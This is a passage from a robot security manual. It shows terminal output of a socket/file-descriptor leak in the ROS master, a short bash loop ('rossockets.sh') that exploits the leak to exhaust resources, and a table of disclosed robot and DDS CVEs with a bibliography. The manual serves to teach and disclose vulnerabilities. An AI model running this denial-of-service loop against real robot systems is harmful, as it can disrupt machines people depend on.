    <span id="cb285-23"><a href="#cb285-23" aria-hidden="true" tabindex="-1"></a><span class="ex">core</span> service [/rosout] found</span>
    <span id="cb285-24"><a href="#cb285-24" aria-hidden="true" tabindex="-1"></a><span class="va">process</span><span class="op">[</span>listener-1<span class="op">]</span><span class="ex">:</span> started with pid [1106]</span>
    <span id="cb285-25"><a href="#cb285-25" aria-hidden="true" tabindex="-1"></a><span class="va">process</span><span class="op">[</span>talker-2<span class="op">]</span><span class="ex">:</span> started with pid [1107]</span>
    <span id="cb285-26"><a href="#cb285-26" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> INFO] [1541160590.106715200]: hello <span class="er">world</span> <span class="ex">0</span></span>
    <span id="cb285-27"><a href="#cb285-27" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> INFO] [1541160590.207328800]: hello <span class="er">world</span> <span class="ex">1</span></span>
    <span id="cb285-28"><a href="#cb285-28" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
    <span id="cb285-29"><a href="#cb285-29" aria-hidden="true" tabindex="-1"></a><span class="ex">^C</span></span></code></pre></div>
    <p>then</p>
    <div class="sourceCode" id="cb286"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb286-1"><a href="#cb286-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@4256f9eb9567:~#</span> lsof <span class="kw">|</span> <span class="fu">grep</span> rosmaster <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-c</span> CLOSE_WAIT</span>
    <span id="cb286-2"><a href="#cb286-2" aria-hidden="true" tabindex="-1"></a><span class="ex">10</span></span></code></pre></div>
    <p>or:</p>
    <div class="sourceCode" id="cb287"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb287-1"><a href="#cb287-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@4256f9eb9567:~#</span> netstat <span class="at">-aeltnp</span> <span class="kw">|</span> <span class="fu">grep</span> CLOSE_WAIT</span>
    <span id="cb287-2"><a href="#cb287-2" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        1      0 172.17.0.2:57826        172.17.0.2:34649        CLOSE_WAIT  0          113151      1468/python</span>
    <span id="cb287-3"><a href="#cb287-3" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        1      0 172.17.0.2:42052        172.17.0.2:37739        CLOSE_WAIT  0          114078      1468/python</span>
    <span id="cb287-4"><a href="#cb287-4" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 172.17.0.2:45088        172.17.0.2:11311        CLOSE_WAIT  0          114002      1454/rosout</span></code></pre></div>
    <p>(note the correlation between the <code>python</code> Program Names sockets and the amount of file descriptors open (5 times that quantity to be precise)).</p>
    <p>There is a FDs leakeage in <code>Indigo</code> distro.</p>
    <h4 id="jade">Jade</h4>
    <p>Same issue applies to <code>Jade</code>, FDs leakeage.</p>
    <h3 id="automating-the-exploitation">Automating the exploitation</h3>
    <p>The simplest way to do so is to put together a script that exploits the flaw and name it <code>rossockets.sh</code>:</p>
    <div class="sourceCode" id="cb288"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb288-1"><a href="#cb288-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
    <span id="cb288-2"><a href="#cb288-2" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="fu">true</span><span class="kw">;</span> <span class="cf">do</span></span>
    <span id="cb288-3"><a href="#cb288-3" aria-hidden="true" tabindex="-1"></a><span class="ex">roslaunch</span> /opt/ros/indigo/share/roscpp_tutorials/launch/talker_listener.launch <span class="kw">&amp;</span> <span class="fu">sleep</span> 2<span class="kw">;</span> <span class="bu">kill</span> <span class="at">-INT</span> %+</span>
    <span id="cb288-4"><a href="#cb288-4" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span></code></pre></div>
    <p>then:</p>
    <div class="sourceCode" id="cb289"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb289-1"><a href="#cb289-1" aria-hidden="true" tabindex="-1"></a><span class="ex">roscore</span> <span class="kw">&amp;</span></span>
    <span id="cb289-2"><a href="#cb289-2" aria-hidden="true" tabindex="-1"></a><span class="ex">./rossockets.sh</span> <span class="op">&gt;</span> /tmp/dump.txt <span class="kw">&amp;</span></span>
    <span id="cb289-3"><a href="#cb289-3" aria-hidden="true" tabindex="-1"></a><span class="ex">watch</span> <span class="at">-n0</span> <span class="st">&quot;lsof | grep rosmaster | grep -c CLOSE_WAIT&quot;</span></span></code></pre></div>
    <p>you will see how the number of file descriptors will start increasing and reach one thousand in a few minutes.</p>
    <h3 id="resources-20">Resources</h3>
    <ul>
    <li>[1] Mendia, G. O., Juan, L. U. S., Bascaran, X. P., Calvo, A. B., Cordero, A. H., Ugarte, I. Z., … &amp; Vilches, V. M. (2018). Robotics CTF (RCTF), a playground for robot hacking. arXiv preprint arXiv:1810.02690.</li>
    <li>[2] Scenarios of the Robotics CTF (RCTF), a playground to challenge robot security. Retrieved from https://github.com/aliasrobotics/RCTF</li>
    <li>[3] rosmaster leaves sockets in CLOSE_WAIT state. Retrieved from https://github.com/ros/ros_comm/issues/610.</li>
    <li>[4] Close CLOSE_WAIT sockets by default. Retrieved from https://github.com/ros/ros_comm/pull/1104.</li>
    </ul>
    <h1 id="findings">Findings</h1>
    <p>A (likely incomplete) list of the security findings contributed while building this manual is summarized below. This list is provided as a reference of what type of security flaws one should expect in modern robot technologies.</p>
    <p>Refer to each one of the security flaws and/or the corresponding advisories for additional details:</p>
    <table>
    <colgroup>
    <col style="width: 16%" />
    <col style="width: 26%" />
    <col style="width: 20%" />
    <col style="width: 20%" />
    <col style="width: 16%" />
    </colgroup>
    <thead>
    <tr class="header">
    <th>CVE ID</th>
    <th>Description</th>
    <th>Scope</th>
    <th>CVSS</th>
    <th>Notes</th>
    </tr>
    </thead>
    <tbody>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/922">CVE-2019-19625</a></td>
    <td>The tools to generate and distribute keys for ROS 2 (SROS2) and use the underlying security plugins of DDS from ROS 2 leak node information due to a leaky default configuration (<a href="https://github.com/ros2/sros2/blob/master/sros2/sros2/policy/defaults/dds/governance.xml#L13">link</a>). This exposure was first raised in the Security Workshop of ROSCon 2019 (Nov. 2019). Further debugging the flaw indicates that there might be some additional underlying issues.</td>
    <td>ROS 2 Eloquent, Dashing</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/922">7.5</a></td>
    <td>A first attempt to mitigate it <a href="https://github.com/ros2/sros2/pull/171">in here</a>. No further time allocated.</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1408">CVE-2019-19626</a></td>
    <td>Bash scripts (magic UR files) get launched automatically with root privileges and without validation or sanitizing</td>
    <td>CB-series UR3, UR5, UR10</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1408">6.8</a> (<em>10.0 with RVSS</em>)</td>
    <td>CB 3.1 3.4.5-100</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/926">CVE-2019-19627</a></td>
    <td>SROS2 leaks node information, regardless of <code>rtps_protection_kind</code> setup</td>
    <td>ROS 2 Eloquent, ROS 2 Dashing</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/926">6.5</a></td>
    <td>Confirmed with FastRTPS DDS implementation as the underlying communication middleware of ROS 2</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1444">CVE-2020-10264</a></td>
    <td>RTDE Interface allows unauthenticated reading of robot data and unauthenticated writing of registers and outputs</td>
    <td>CB-series 3.1 UR3, UR5, UR10, e-series UR3e, UR5e, UR10e, UR16e</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1444">9.8</a></td>
    <td>CB 3.1 SW Version 3.3 and upwards, e-series SW version 5.0 and upwards</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1443">CVE-2020-10265</a></td>
    <td>UR dashboard server enables unauthenticated remote control of core robot functions</td>
    <td>CB-series 2 and 3.1 UR3, UR5, UR10, e-series UR3e, UR5e, UR10e, UR16e</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1443">9.4</a></td>
    <td>Version CB2 SW Version 1.4 upwards, CB3 SW Version 3.0 and upwards, e-series SW Version 5.0 and upwards</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1487">CVE-2020-10266</a></td>
    <td>No integrity checks on UR+ platform artifacts when installed in the robot</td>
    <td>CB-series 3.1 UR3, UR5, UR10</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1487">8.8</a></td>
    <td>CB-series 3.1 FW versions 3.3 up to 3.12.1. Possibly affects older robots and newer (e-series)</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1489">CVE-2020-10267</a></td>
    <td>Unprotected intelectual property in Universal Robots controller CB 3.1 across firmware versions</td>
    <td>CB-series 3.1 UR3, UR5 and UR10</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1489">7.5</a></td>
    <td>tested on 3.13.0, 3.12.1, 3.12, 3.11 and 3.10.0</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2550">CVE-2020-10268</a></td>
    <td>Terminate Critical Services in KUKA controller KR C4</td>
    <td>KR3R540, KRC4, KSS8.5.7HF1, Win7_Embedded</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2550">6.1</a></td>
    <td>Breaks robot calibration, requires afterwards special tools.</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2566">CVE-2020-10269</a></td>
    <td>Hardcoded Credentials on MiRX00 wireless Access Point</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2566">9.8</a></td>
    <td>firmware v2.8.1.1 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2557">CVE-2020-10270</a></td>
    <td>Hardcoded Credentials on MiRX00 Control Dashboard</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2557">9.8</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2555">CVE-2020-10271</a></td>
    <td>MiR ROS computational graph is exposed to all network interfaces, including poorly secured wireless networks and open wired ones</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2555">10.0</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2554">CVE-2020-10272</a></td>
    <td>MiR ROS computational graph presents no authentication mechanisms</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2554">10.0</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2560">CVE-2020-10273</a></td>
    <td>Unprotected intellectual property in Mobile Industrial Robots (MiR) controllers</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2560">7.5</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2556">CVE-2020-10274</a></td>
    <td>MiR REST API allows for data exfiltration by unauthorized attackers (e.g. indoor maps)</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2556">7.1</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2565">CVE-2020-10275</a></td>
    <td>Weak token generation for the REST API</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2565">9.8</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2558">CVE-2020-10276</a></td>
    <td>Default credentials on SICK PLC allows disabling safety features</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2558">9.8</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2562">CVE-2020-10277</a></td>
    <td>Booting from a live image leads to exfiltration of sensible information and privilege escalation</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2562">6.4</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2561">CVE-2020-10278</a></td>
    <td>Unprotected BIOS allows user to boot from live OS image</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2561">6.1</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2569">CVE-2020-10279</a></td>
    <td>Insecure operating system defaults in MiR robots</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2569">10.0</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2568">CVE-2020-10280</a></td>
    <td>Apache server is vulnerable to a DoS</td>
    <td>MiR100, MiR250, MiR200, MiR500, MiR1000, ER200, ER-Flex, ER-Lite, UVD Robots model A, model B</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2568">8.2</a></td>
    <td>v2.8.1.1 and before</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3315">CVE-2020-10281</a></td>
    <td>Cleartext transmission of sensitive information in MAVLink protocol version 1.0 and 2.0</td>
    <td>MAVLink and related autopilots (ArduPilot, PX4)</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3315">7.5</a></td>
    <td>MAVLink v2.0 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3316">CVE-2020-10282</a></td>
    <td>No authentication in MAVLink protocol</td>
    <td>MAVLink 1.0 and related autopilots (ArduPilot, PX4)</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3316">9.8</a></td>
    <td></td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3317">CVE-2020-10283</a></td>
    <td>MAVLink version handshaking allows for an attacker to bypass authentication</td>
    <td>MAVLink 2.0 and before in all related autopilots (ArduPilot, PX4)</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3317">10.0</a></td>
    <td></td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3321">CVE-2020-10284</a></td>
    <td>No Authentication required to exert manual control of the robot</td>
    <td>xArm5, xArm6, xArm7</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3321">10.0</a></td>
    <td>v1.5.0 and before</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3322">CVE-2020-10285</a></td>
    <td>Weak authentication implementation make the system vulnerable to a brute-force attack over adjacent networks</td>
    <td>xArm5, xArm6, xArm7</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3322">8.3</a></td>
    <td>v1.5.0 and before</td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3323">CVE-2020-10286</a></td>
    <td>Mismanaged permission implementation leads to privilege escalation, exfiltration of sensitive information, and DoS</td>
    <td>xArm5, xArm6, xArm7</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3323">8.3</a></td>
    <td>v1.5.0 and before</td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3326">CVE-2020-10287</a></td>
    <td>Hardcoded default credentials on IRC 5 OPC Server</td>
    <td>ABB IRB140 IRC5</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3326">9.1</a></td>
    <td></td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3327">CVE-2020-10288</a></td>
    <td>No authentication required for accesing ABB IRC5 FTP serve</td>
    <td>ABB’s IRB140, IRC5, Robotware_5.09, VxWorks5.5.1</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3327">9.8</a></td>
    <td></td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2401">CVE-2020-10289</a></td>
    <td>Use of unsafe yaml load, ./src/actionlib/tools/library.py</td>
    <td>ROS Jade, Kinetic, Lunar, Melodic and Noetic</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/2401">8.0</a></td>
    <td>Mitigated in <a href="https://github.com/ros/actionlib/pull/170">PR-Melodic</a> and <a href="https://github.com/ros/actionlib/pull/171">PR-Noetic</a></td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1495">CVE-2020-10290</a></td>
    <td>Universal Robots URCaps execute with unbounded privileges</td>
    <td>CB-series 3.1 UR3, UR5 and UR10</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/1495">6.8</a></td>
    <td></td>
    </tr>
    <tr class="odd">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3336">CVE-2020-10291</a></td>
    <td>System information disclosure without authentication on KUKA simulators</td>
    <td>KUKA Visual Components Network License Server 2.0.8</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3336">7.5</a></td>
    <td></td>
    </tr>
    <tr class="even">
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3337">CVE-2020-10292</a></td>
    <td>Service DoS through arbitrary pointer dereferencing on KUKA simulator</td>
    <td>KUKA Visual Components Network License Server 2.0.8</td>
    <td><a href="https://github.com/aliasrobotics/RVD/issues/3337">8.2</a></td>
    <td></td>
    </tr>
    <tr class="odd">
    <td>CVE-2021-38445</td>
    <td>OCI OpenDDS versions prior to 3.18.1 do not handle a length parameter consistent with the actual length of the associated data, which may allow an attacker to remotely execute arbitrary code.</td>
    <td>OpenDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H">7.0</a></td>
    <td>Failed assertion <a href="https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1">&gt;= 3.18.1</a></td>
    </tr>
    <tr class="even">
    <td>CVE-2021-38447</td>
    <td>OCI OpenDDS versions prior to 3.18.1 are vulnerable when an attacker sends a specially crafted packet to flood target devices with unwanted traffic, which may result in a denial-of-service condition.</td>
    <td>OpenDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H">8.6</a></td>
    <td>Resource exhaustion <a href="https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1">&gt;= 3.18.1</a></td>
    </tr>
    <tr class="odd">
    <td>CVE-2021-38435</td>
    <td>RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions 3.0.0 and later do not correctly calculate the size when allocating the buffer, which may result in a buffer overflow</td>
    <td>ConnextDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:M/AR:H">8.6</a></td>
    <td>Segmentation fault via network <a href="https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071">&gt;= 6.1.0</a></td>
    </tr>
    <tr class="even">
    <td>CVE-2021-38423</td>
    <td>All versions of GurumDDS improperly calculate the size to be used when allocating the buffer, which may result in a buffer overflow.</td>
    <td>GurumDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RC:C/CR:M/AR:H">8.6</a></td>
    <td>Segmentation fault via network</td>
    </tr>
    <tr class="odd">
    <td>CVE-2021-38439</td>
    <td>All versions of GurumDDS are vulnerable to heap-based buffer overflow, which may cause a denial-of-service condition or remotely execute arbitrary code.</td>
    <td>GurumDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RC:C/CR:M/AR:H">8.6</a></td>
    <td>Heap-overflow via network</td>
    </tr>
    <tr class="even">
    <td>CVE-2021-38437</td>
    <td></td>
    <td>GurumDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:U/RC:C/CR:M/AR:H">7.3</a></td>
    <td>Unmaintained XML lib.</td>
    </tr>
    <tr class="odd">
    <td>CVE-2021-38441</td>
    <td>Eclipse CycloneDDS versions prior to 0.8.0 are vulnerable to a write-what-where condition, which may allow an attacker to write arbitrary values in the XML parser.</td>
    <td>CycloneDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H/E:U/RL:O/RC:C/CR:M/AR:H">6.6</a></td>
    <td>Heap-write in XML parser</td>
    </tr>
    <tr class="even">
    <td>CVE-2021-38443</td>
    <td>Eclipse CycloneDDS versions prior to 0.8.0 improperly handle invalid structures, which may allow an attacker to write arbitrary values in the XML parser.</td>
    <td>CycloneDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H/E:U/RL:O/RC:C/CR:M/AR:H">6.6</a></td>
    <td>8-bytes heap-write in XML parser</td>
    </tr>
    <tr class="odd">
    <td>CVE-2021-38427</td>
    <td>RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions 3.0.0 and later are vulnerable to a stack-based buffer overflow, which may allow a local attacker to execute arbitrary code</td>
    <td>RTI ConnextDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H/E:U/RL:O/RC:C/CR:H/AR:H">6.6</a></td>
    <td>Stack overflow in XML parser <a href="https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071">&gt;= 6.1.0</a></td>
    </tr>
    <tr class="even">
    <td>CVE-2021-38433</td>
    <td>RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions 3.0.0 and later are vulnerable to a stack-based buffer overflow, which may allow a local attacker to execute arbitrary code.</td>
    <td>RTI ConnextDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H/E:U/RL:O/RC:C/CR:H/AR:H">6.6</a></td>
    <td>Stack overflow in XML parser <a href="https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071">&gt;= 6.1.0</a></td>
    </tr>
    <tr class="odd">
    <td>CVE-2021-38487</td>
    <td>RTI Connext DDS Professional, Connext DDS Secure Versions 4.2x to 6.1.0, and Connext DDS Micro Versions 3.0.0 and later are vulnerable when an attacker sends a specially crafted packet to flood victims’ devices with unwanted traffic, which may result in a denial-of-service condition.</td>
    <td>ConnextDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:L/AR:H">8.6</a></td>
    <td><a href="https://community.rti.com/kb/ics-cert-security-notice-ics-vu-575352-vu770071">Mitigation patch in &gt;= 6.1.0</a></td>
    </tr>
    <tr class="even">
    <td>CVE-2021-38429</td>
    <td>OCI OpenDDS versions prior to 3.18.1 are vulnerable when an attacker sends a specially crafted packet to flood victims’ devices with unwanted traffic, which may result in a denial-of-service condition.</td>
    <td>OpenDDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C/CR:L/AR:H">8.6</a></td>
    <td><a href="https://github.com/objectcomputing/OpenDDS/releases/tag/DDS-3.18.1">Mitigation patch in &gt;= 3.18.1</a></td>
    </tr>
    <tr class="odd">
    <td>CVE-2021-38425</td>
    <td>eProsima Fast-DDS versions prior to 2.4.0 (#2269) are susceptible to exploitation when an attacker sends a specially crafted packet to flood a target device with unwanted traffic, which may result in a denial-of-service condition.</td>
    <td>eProsima Fast-DDS, ROS 2<sub>*</sub></td>
    <td><a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:T/RC:C/CR:L/AR:H">8.6</a></td>
    <td><a href="https://github.com/eProsima/Fast-DDS/issues/2267">WIP mitigation in master</a></td>
    </tr>
    </tbody>
    </table>
    <blockquote>
    <p><sub>*</sub>: All ROS 2 versions in scope if powered by the vulnerable DDS middleware implementation.</p>
    </blockquote>
    <h1 id="bibliography">Bibliography</h1>
    <!--
    INVALID: see bibliography.bib

    ## Robot exploitation

    ### Tutorial 1

    - [1] M. Hicks (2014), *Software Security*, Coursera, Cybersecurity Specialization, University of Maryland, College Park, <https://www.coursera.org/learn/software-security>.
    - [2] CERN Computer Security Team (2018, February 12), *Memory Layout of C Programs*. Retrieved from https://security.web.cern.ch/security/recommendations/en/codetools/c.shtml.
    - [3] A. One (1996), Smashing the Stack for Fun and Profit. Phrack, 7. Retrieved from http://insecure.org/stf/smashstack.html.
    - [4] P. Bright (2015), *How security flaws work: The buffer overflow*. Retrieved from https://arstechnica.com/information-technology/2015/08/how-security-flaws-work-the-buffer-overflow/.

    ### Tutorial 2

    - [1] M. Hicks (2014), *Software Security*, Coursera, Cybersecurity Specialization, University of Maryland, College Park, <https://www.coursera.org/learn/software-security>.
    - [2] A. One (1996), Smashing the Stack for Fun and Profit. Phrack, 7. Retrieved from http://insecure.org/stf/smashstack.html.
    - [3] P. Clement (2011), *execve("/bin//sh", ["/bin//sh"], NULL) - Linux elf32-i386*. Retrieved from https://blog.thireus.com/execvebinsh-binsh-null/

    ### Tutorial 3


    ### Tutorial 4

    - [1] M. Hicks (2014), *Software Security*, Coursera, Cybersecurity Specialization, University of Maryland, College Park, <https://www.coursera.org/learn/software-security>.
    - [2] Hovav Shacham (2007), *The geometry of innocent flesh on the bone: return-into-libc without function calls (on the x86)*. In Proceedings of the 14th ACM conference on Computer and communications security (CCS '07). ACM, New York, NY, USA, 552-561. DOI: https://doi.org/10.1145/1315245.1315313
    - [3] Alex Reece (2013). *Introduction to return oriented programming (ROP)*. Retrieved from http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html.
    - [4] Wikipedia. *Return-to-libc attack*. Retrieved from https://en.wikipedia.org/wiki/Return-to-libc_attack.
    - [5] Wikipedia. *Address space layout randomization*. Retrieved from https://en.wikipedia.org/wiki/Address_space_layout_randomization.

    ### Tutorial 5
    - [1] M. Hicks (2014), *Software Security*, Coursera, Cybersecurity Specialization, University of Maryland, College Park, <https://www.coursera.org/learn/software-security>.
    - [2] Hovav Shacham (2007), *The geometry of innocent flesh on the bone: return-into-libc without function calls (on the x86)*. In Proceedings of the 14th ACM conference on Computer and communications security (CCS '07). ACM, New York, NY, USA, 552-561. DOI: https://doi.org/10.1145/1315245.1315313
    - [3] Alex Reece (2013). *Introduction to return oriented programming (ROP)*. Retrieved from http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html.
    - [4] Georgia Tech (2016). *CS 6265: Information Security Lab. Schedule*. Retrieved from https://tc.gtisc.gatech.edu/cs6265/2016/cal.html
    - [5] Georgia Tech (2017). *CS 6265: Information Security Lab. Schedule*. Retrieved from https://tc.gtisc.gatech.edu/cs6265/2017/cal.html
    - [6] Georgia Tech (2017). *CS 6265: Information Security Lab. Lec07: Return-oriented Programming*. Retrieved from https://tc.gtisc.gatech.edu/cs6265/2016/l/lab07-rop/README-tut.txt
